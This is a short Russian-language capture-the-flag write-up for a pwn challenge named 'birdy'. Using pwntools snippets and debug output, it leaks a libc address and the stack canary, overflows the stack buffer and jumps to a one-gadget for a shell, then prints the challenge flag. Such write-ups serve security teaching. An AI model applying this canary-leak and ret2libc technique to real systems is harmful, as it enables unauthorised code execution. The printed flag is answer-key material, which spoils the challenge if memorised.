# birdy

Патчим бинарник с помощью pwninit, открываем и видим две функции для чтения и записи на стек.

Если вызвать функцию read_buffer предварительно не записав никаких данных, то наш буфер будет указывать на структуру _IO_2_1_stdout из libc, наша функция выведет указатель на этот адрес, сразу подсчитаем его оффсет от базы libc, это пригодится позже для ret2_libc.
```
00007FFF779501D0  00007FFF77950200  [stack]:00007FFF77950200
00007FFF779501D8  0000000164095C0F  
00007FFF779501E0  00007F06642045C0  libc.so.6:_IO_2_1_stdout_
00007FFF779501E8  00007F0664202030  libc.so.6:_IO_file_jumps
00007FFF779501F0  0000000000000000 
```
```
base = p.recvline()
base = base[-7:-1]
print(base)
base = u64(base.ljust(8, b"\x00")) - 2115008
#offset 0x2045C0 in hex
```
---
Теперь надо ликнуть адрес канарейки, для этого мы воспользуемся свойством функции read из libc - не добавлять 0x00 в конце считываемой строки. Для этого запишем в буфер ровно 73 байта (73 байт для перетирания нуля в канарейке) и потом считываем наш буфер.
```
p.sendline(b"2")
p.recv()

p.sendline(b"73")
p.send(b"A" * 73)

p.recv()
p.sendline(b"1")

can = p.recvline()
can = can[-8:-1]
```
Канарейка ликнута.

---
Переполняем буфер не забыв вставить канарейку, выполняем one gadget в libc.
```
p.sendline(b"144")
p.send(b"A" * 72 + p8(0) + can +b"A" * 8 +  p64(0) +  b"A" * 40 + p64(one)) #нули для правильной работы гаджета
p.sendline(b"3")
```
---
Получаем шелл, печатаем флаг.
```
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x25 bytes:
    b'MSKCTF{l33king_7h3_c4n4r33_fc4b809c}\n'
```

---
# Flag: MSKCTF{l33king_7h3_c4n4r33_fc4b809c}

